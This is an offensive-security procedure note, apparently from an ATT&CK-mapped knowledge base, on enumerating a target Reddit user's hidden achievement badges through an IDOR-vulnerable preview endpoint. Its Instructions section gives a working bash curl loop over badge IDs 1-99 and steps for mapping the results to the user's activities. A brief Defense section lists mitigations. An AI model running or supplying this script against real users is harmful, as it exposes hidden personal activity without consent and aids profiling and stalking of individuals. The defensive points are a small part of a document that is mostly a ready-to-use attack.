---
id: proc-uuid-5
tags:
  - enumeration
  - badge-discovery
  - reddit
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-reddit-badge-preview]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:25:33.808Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Enumerate-User-Achievement-Badges

## Summary

This procedure systematically enumerates all achievement badges (pinned and hidden) for a target Reddit user by iterating over incremental IDs in the IDOR-vulnerable preview endpoint.

## Description

Using public usernames and 1-2 digit IDs (1-99), request previews to collect existing badges. Images reveal hidden activities like community participation. Automatable with scripts; manual for small ranges. Exposes engagement patterns, breaching confidentiality.

## Requirements

1. Target username
2. Script or loop for IDs 1-99
3. Ability to parse HTTP responses (image vs. error)

## Defense

Defensive measures and detection strategies:

- Randomize or obscure badge IDs
- Authenticate preview requests
- Block rapid sequential requests

## Objectives

1. Iterate over possible badge IDs
2. Identify existing badges via responses
3. Compile list of hidden user achievements

## Instructions

### Step 1: Prepare Enumeration Script

**Context**: Automate ID iteration.

Use a loop with [[commands/curl-reddit-badge-preview]]:

```bash
for id in {1..99}; do
  curl -s https://share.redd.it/preview/user/<target>/achievement/$id?show-user-info=true -o badge_$id.png
  if [[ -s badge_$id.png && $(file badge_$id.png) == *image* ]]; then
    echo "Badge $id exists"
  fi
  rm badge_$id.png
  sleep 1  # Avoid rate limits

done
```

> Lists IDs with images.

### Step 2: Manual Testing for Specific Ranges

**Context**: Verify small sets.

Test IDs 1-20 manually in browser or curl.

### Step 3: Analyze Results

**Context**: Map badges to activities.

Correlate IDs to known achievements (e.g., 10 = New Share) for insights into user behavior.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques

-

## Commands Used

- [[commands/curl-reddit-badge-preview]]

## Tools Used

-

## Tags

- [[enumeration]]
- [[badge-discovery]]
- [[reddit]]
